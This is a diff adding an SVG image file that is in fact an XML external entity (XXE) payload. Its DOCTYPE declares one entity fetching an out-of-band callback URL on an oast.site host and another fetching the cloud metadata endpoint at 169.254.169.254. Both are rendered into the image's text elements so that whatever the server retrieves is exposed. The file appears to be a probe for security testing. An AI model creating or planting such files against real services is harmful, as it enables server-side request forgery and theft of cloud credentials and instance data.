@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "https://yktfdg0mf4n6daxvm4egs37z66cwxrgrh.oast.site/svg-xxe-entity">
+  <!ENTITY xxe2 SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200" viewBox="0 0 400 200">
+  <rect width="400" height="200" fill="#e0ffff"/>
+  <text x="10" y="20" font-size="12">&xxe;</text>
+  <text x="10" y="40" font-size="12">&xxe2;</text>
+</svg>
